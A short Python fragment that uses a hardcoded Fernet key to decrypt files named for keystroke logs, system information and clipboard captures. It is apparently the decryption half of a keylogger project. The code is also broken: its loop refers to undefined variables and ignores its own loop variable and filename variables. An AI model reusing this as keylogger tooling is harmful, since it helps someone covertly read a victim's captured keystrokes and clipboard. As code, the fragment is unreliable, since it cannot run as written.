from cryptography.fernet import Fernet

key = "nSjqDwJeag7R5fbYO1GFl7CPIeGKoN4GV0mAOK-DrQE=" #Change everytime whenever the Key is being generated

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

for encrypting_file in files_to_encrypt:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1